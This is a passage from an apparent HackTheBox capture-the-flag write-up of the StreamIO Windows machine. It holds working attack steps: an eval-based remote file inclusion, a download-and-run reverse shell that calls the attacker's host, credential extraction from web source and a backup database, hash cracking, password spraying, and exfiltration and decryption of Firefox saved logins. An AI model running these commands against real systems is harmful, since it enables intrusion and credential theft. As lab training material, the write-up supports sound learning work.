oxdf@hacky$ echo "PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==" | base64 -d > master.php

```

The source shows that it starts by ensuring that it’s being included, else it returns a message:

```

if(!defined('included'))
        die("Only accessable through includes");

```

After that, it seems to reasonably recreate the the various DB objects, just like I observed.

At the very bottom, there’s an HTML form with a hidden field, `include`:

```

<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" )
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>

```

If there’s a POST parameter `include`, it will use `file_get_contents` of that file and pass it to `eval`, which is basically execution.

### Remote Execution

#### Strategy

I can use `/admin/index.php` to include `master.php`. I’ll send a POST request to `/admin/?debug=master.php` and then in the POST body have it `include=[something]`, and that result will be executed.

As I don’t have a foothold on the box yet, that’s only really useful right now if I can fetch something from my system using `file_get_contents`.

#### RFI(ish) POC

I’ll test this by opening Burp and sending the request over to Repeater. I’ll change the GET to POST, and add the POST data:

![image-20220912184820916](https://0xdfimages.gitlab.io/img/image-20220912184820916.png)

I’ll make sure to have a Python webserver running (`python -m http.server 80`) and when I send this in Burp, there’s a hit:

```
10.10.11.158 - - [12/Sep/2022 22:44:06] code 404, message File not found
10.10.11.158 - - [12/Sep/2022 22:44:06] "GET /rce.php HTTP/1.0" 404 -

```

#### RCE POC

I’ll update `rce.php` to be some PHP I want to execute. Since this isn’t being included, but rather passed to `eval`, I won’t need the `<?php` and `?>`. Just this will do:

```

system("dir C:\\");

```

When I send again, there’s a directory listing at the bottom of the page:

[![image-20220912185325982](https://0xdfimages.gitlab.io/img/image-20220912185325982.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220912185325982.png)

#### Shell

I’ll write `shell.php` to get a reverse shell with `nc64.exe`:

```

system("powershell -c wget 10.10.14.6/nc64.exe -outfile \\programdata\\nc64.exe");
system("\\programdata\\nc64.exe -e powershell 10.10.14.6 443");

```

Now on requesting that via `master.php`, there’s a hit for `shell.php`, then `nc64.exe`:

```
10.10.11.158 - - [12/Sep/2022 22:53:01] "GET /shell.php HTTP/1.0" 200 -
10.10.11.158 - - [12/Sep/2022 22:53:02] "GET /nc64.exe HTTP/1.1" 200 -

```

And then a connection at a listening `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.158 62969
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> whoami
streamio\yoshihide

```

## Shell as nikk37

### Enumeration

#### Home Directories

yoshihide doesn’t have a home directory on this machine, but there are a couple other users:

```

PS C:\users> ls

    Directory: C:\users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:48 AM                .NET v4.5
d-----        2/22/2022   2:48 AM                .NET v4.5 Classic
d-----        2/26/2022  10:20 AM                Administrator
d-----         5/9/2022   5:38 PM                Martin
d-----        2/26/2022   9:48 AM                nikk37
d-r---        2/22/2022   1:33 AM                Public 

```

#### Web

There’s not much else on the box of interest, so I’ll head back into the web directories. In `\inetpub\watch.streamio.htb`, there’s a connection string in `search.php`:

```

$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');

```

I’ll use the Windows equivalent of a recursive `grep` to find other strings of the same format:

```

PS C:\inetpub\streamio.htb> dir -recurse *.php | select-string -pattern "database"

admin\index.php:9:$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
login.php:46:$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
register.php:81:    $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');

```

There’s another instance connecting as db\_user in `admin\index.php`, but in `register.php`, it connects as db\_admin.

### streamio\_backup DB

I noted earlier that I couldn’t access the `streamio_backup` database. With new creds (and a user called admin), it’s worth trying again. I could upload [Chisel](https://github.com/jpillora/chisel) and tunnel to port 1433 (MSSQL), but `sqlcmd` happens to be installed and available on StreamIO:

```

PS C:\> where.exe sqlcmd
C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE

```

I can’t use it interactively with my shell, but I can issue single commands per invocation at the command line using some command line arguments:
- `-S localhost` - host to connect to
- `-U db_admin` - the user to connect with
- `-P B1@hx31234567890` - password for the user
- `-d streamio_backup` - database to use
- `-Q [query]` - query to run and then exit

There are the same two tables as the main DB:

```

PS C:\> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
table_name
--------------------------------------------------------------------------------------------------------------------------------
movies
users

(2 rows affected)

```

The `users` tables has some different users from the original dump:

```

PS C:\> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  

(8 rows affected)

```

### Crack Passwords

I’ll create a text file with these hashes:

```

oxdf@hacky$ cat user-passwords-backup
nikk37:389d14cb8e4e9b94b137deb1caf0612a
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
James:c660060492d9edcaa8332d89c99c9239
Theodore:925e5408ecb67aea449373d668b7359e
Samantha:083ffae904143c4796e464dac33c1f7d
Lauren:08344b85b329d7efd611b7a7743e8a09
William:d62be0dc82071bccc1322d64ec5b6c51
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5

```

Several crack:

```

$/opt/hashcat-6.2.5/hashcat.bin user-passwords-backup /usr/share/wordlists/rockyou.txt -m0 --user
...[snip]...
$/opt/hashcat-6.2.5/hashcat.bin user-passwords-backup /usr/share/wordlists/rockyou.txt -m0 --user --show
nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$

```

### WinRM

#### Find Use for Passwords

I’ll add these to the `user` and `pass` files from earlier:

```

$/opt/hashcat-6.2.5/hashcat.bin user-passwords-backup /usr/share/wordlists/rockyou.txt -m0 --user --show | cut -d: -f 1 >> user
$/opt/hashcat-6.2.5/hashcat.bin user-passwords-backup /usr/share/wordlists/rockyou.txt -m0 --user --show | cut -d: -f 3 >> pass 

```

`crackmapexec` shows that the password for nikk37 works on the system:

```

oxdf@hacky$ crackmapexec smb 10.10.11.158 -u user -p pass --continue-on-success --no-bruteforce
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Barry:$hadoW STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Bruno:$monique$1991$ STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Clara:%$clara STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\dfdfdf:dfdfdf STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Juliette:$3xybitch STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lauren:##123a8j8w5123## STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lenord:physics69i STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Michelle:!?Love?!123 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Thane:highschoolmusical STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Victoria:!5psycho8! STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lauren:##123a8j8w5123## STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE 

```

It also seems to work on WinRM (not sure what that last error line is):

```

oxdf@hacky$ crackmapexec winrm 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'
SMB         10.10.11.158    5985   NONE             [*] None (name:10.10.11.158) (domain:None)
HTTP        10.10.11.158    5985   NONE             [*] http://10.10.11.158:5985/wsman
WINRM       10.10.11.158    5985   NONE             [+] None\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
WINRM       10.10.11.158    5985   NONE             [-] None\nikk37:get_dem_girls2@yahoo.com "'NoneType' object has no attribute 'upper'"

```

Another way to see this will work with WinRM is that `net user nikk37` also shows that they are in the `Remove Management Users” group:

```

PS C:\> net user nikk37
net user nikk37
User name                    nikk37
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 2:57:16 AM
Password expires             Never
Password changeable          2/23/2022 2:57:16 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2/22/2022 3:39:51 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         
The command completed successfully.

```

#### Evil-WinRM

I’ll connect with `evil-winrm`:

```

oxdf@hacky$ evil-winrm -u nikk37 -p 'get_dem_girls2@yahoo.com' -i 10.10.11.158

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nikk37\Documents>

```

The user flag is on the desktop:

```
*Evil-WinRM* PS C:\Users\nikk37\desktop> type user.txt
0ca7bfc4************************

```

## Auth as JDgodd

### Enumeration

Looking around at installed programs on the host, on that is interesting as unusual for HackTheBox machines is Firefox:

```
*Evil-WinRM* PS C:\program files (x86)> ls

    Directory: C:\program files (x86)

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:28 AM                Common Files
d-----        2/25/2022  11:35 PM                IIS
d-----        2/25/2022  11:38 PM                iis express
d-----        3/28/2022   4:46 PM                Internet Explorer
d-----        2/22/2022   1:54 AM                Microsoft SQL Server
d-----        2/22/2022   1:53 AM                Microsoft.NET
d-----        5/26/2022   4:09 PM                Mozilla Firefox
d-----        5/26/2022   4:09 PM                Mozilla Maintenance Service
d-----        2/25/2022  11:33 PM                PHP
d-----        2/22/2022   2:56 AM                Reference Assemblies
d-----        3/28/2022   4:46 PM                Windows Defender
d-----        3/28/2022   4:46 PM                Windows Mail
d-----        3/28/2022   4:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        3/28/2022   4:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                WindowsPowerShell

```

I could have noticed this from the previous user, but that user didn’t have a home directory. nikk37 has a home directory, with a Firefox profile:

```
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles> ls

    Directory: C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:40 AM                5rwivk2l.default
d-----        2/22/2022   2:42 AM                br53rxeg.default-release

```

The first is rather empty, but the second has all the standard files:

```
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> ls

    Directory: C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:40 AM                bookmarkbackups
d-----        2/22/2022   2:40 AM                browser-extension-data
d-----        2/22/2022   2:41 AM                crashes
d-----        2/22/2022   2:42 AM                datareporting
d-----        2/22/2022   2:40 AM                minidumps
d-----        2/22/2022   2:42 AM                saved-telemetry-pings
d-----        2/22/2022   2:40 AM                security_state
d-----        2/22/2022   2:42 AM                sessionstore-backups
d-----        2/22/2022   2:40 AM                storage
-a----        2/22/2022   2:40 AM             24 addons.json
-a----        2/22/2022   2:42 AM           5189 addonStartup.json.lz4
-a----        2/22/2022   2:42 AM            310 AlternateServices.txt
-a----        2/22/2022   2:41 AM         229376 cert9.db
-a----        2/22/2022   2:40 AM            208 compatibility.ini
-a----        2/22/2022   2:40 AM            939 containers.json
-a----        2/22/2022   2:40 AM         229376 content-prefs.sqlite
-a----        2/22/2022   2:40 AM          98304 cookies.sqlite
-a----        2/22/2022   2:40 AM           1081 extension-preferences.json
-a----        2/22/2022   2:40 AM          43726 extensions.json
-a----        2/22/2022   2:42 AM        5242880 favicons.sqlite
-a----        2/22/2022   2:41 AM         262144 formhistory.sqlite
-a----        2/22/2022   2:40 AM            778 handlers.json
-a----        2/22/2022   2:40 AM         294912 key4.db
-a----        2/22/2022   2:41 AM           1593 logins-backup.json
-a----        2/22/2022   2:41 AM           2081 logins.json
-a----        2/22/2022   2:42 AM              0 parent.lock
-a----        2/22/2022   2:42 AM          98304 permissions.sqlite
-a----        2/22/2022   2:40 AM            506 pkcs11.txt
-a----        2/22/2022   2:42 AM        5242880 places.sqlite
-a----        2/22/2022   2:42 AM           8040 prefs.js
-a----        2/22/2022   2:42 AM            180 search.json.mozlz4
-a----        2/22/2022   2:42 AM            288 sessionCheckpoints.json
-a----        2/22/2022   2:42 AM           1853 sessionstore.jsonlz4
-a----        2/22/2022   2:40 AM             18 shield-preference-experiments.json
-a----        2/22/2022   2:42 AM            611 SiteSecurityServiceState.txt
-a----        2/22/2022   2:42 AM           4096 storage.sqlite
-a----        2/22/2022   2:40 AM             50 times.json
-a----        2/22/2022   2:40 AM          98304 webappsstore.sqlite
-a----        2/22/2022   2:42 AM            141 xulstore.json

```

### Extract Firefox Passwords

I showed Firefox passwords extraction on [Hancliffe](/2022/03/05/htb-hancliffe.html#decrypt-passwords), including background on how Firefox stores passwords and how one might start decrypting them manually. It gets complex very quick, so I’ll turn to [Firepwd](https://github.com/lclevy/firepwd).

#### Exfil

I need two files from the profile, `key4.db` and `logins.json`. I’ll start an SMB server on my host with `smbserver.py share . -user oxdf -pass oxdf -smb2support`. Then I’ll mount the share on StreamIO, and copy the files into it:

```
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> net use \\10.10.14.6\share /u:oxdf oxdf
The command completed successfully.
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> copy key4.db \\10.10.14.6\share\
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> copy logins.json \\10.10.14.6\share\

```

#### Extract Passwords

With those two files, [Firepwd](https://github.com/lclevy/firepwd) will decrypt any stored passwords:

```

oxdf@hacky$ python /opt/firepwd/firepwd.py 
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'

```

It finds four saved passwords for Slack.

#### Find Password Validity

I’ll use `crackmapexec` with these in the same way, but it doesn’t find anything:

```

oxdf@hacky$ crackmapexec smb 10.10.11.158 -u slack-users -p slack-pass --continue-on-success --no-bruteforce
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:password@12 STATUS_LOGON_FAILURE 

```

The first one is for the admin user, which could be one of the other users. I’ll try again without `--no-bruteforce` to try each password with each user. If this doesn’t find anything, I could update the user list to include all the account from the website earlier, and all the accounts on the machine.

The admin password works for JDgodd (which isn’t surprising since the username is in the password):

```

oxdf@hacky$ crackmapexec smb 10.10.11.158 -u slack-users -p slack-pass --continue-on-success 
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:password@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:password@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:password@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:password@12 STATUS_LOGON_FAILURE

```

Unfortunately, JDgodd doesn’t have permissions to WinRM:

```

oxdf@hacky$ crackmapexec winrm 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
SMB         10.10.11.158    5985   NONE             [*] None (name:10.10.11.158) (domain:None)
HTTP        10.10.11.158    5985   NONE             [*] http://10.10.11.158:5985/wsman
